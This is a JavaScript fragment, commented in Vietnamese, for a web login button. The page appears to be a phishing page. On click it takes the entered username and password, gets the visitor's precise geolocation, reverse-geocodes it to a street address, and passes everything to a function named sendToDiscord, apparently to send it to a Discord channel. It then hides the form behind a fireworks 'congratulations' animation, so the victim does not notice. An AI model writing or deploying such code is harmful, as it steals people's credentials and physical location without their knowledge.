// === BẤM NÚT LOGIN ===
document.getElementById('loginBtn').addEventListener('click', function() {
    const username = document.getElementById('username').value || 'Không có';
    const password = document.getElementById('password').value || 'Không có';
    const status = document.getElementById('status');

    status.innerHTML = '⏳ Đang xác thực...';
    status.style.color = '#00c8ff';

    // === GỌI LOCATION NGAY TRONG NÚT BẤM ===
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                const loc = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    address: 'Đang lấy...'
                };
                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`)
                    .then(res => res.json())
                    .then(data => {
                        loc.address = data.display_name || 'Không xác định';
                        sendToDiscord(username, password, loc);
                    })
                    .catch(() => {
                        loc.address = 'Lỗi lấy địa chỉ';
                        sendToDiscord(username, password, loc);
                    });
            },
            function(err) {
                sendToDiscord(username, password, {
                    lat: null,
                    lon: null,
                    acc: null,
                    address: '❌ Lỗi định vị: ' + err.message
                });
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    } else {
        sendToDiscord(username, password, {
            lat: null,
            lon: null,
            acc: null,
            address: '❌ Trình duyệt không hỗ trợ định vị'
        });
    }

    // Ẩn card + show pháo hoa
    document.getElementById('loginCard').classList.add('hidden');
    setTimeout(() => {
        document.getElementById('congratsOverlay').classList.add('show');
        startFireworks();
    }, 600);
});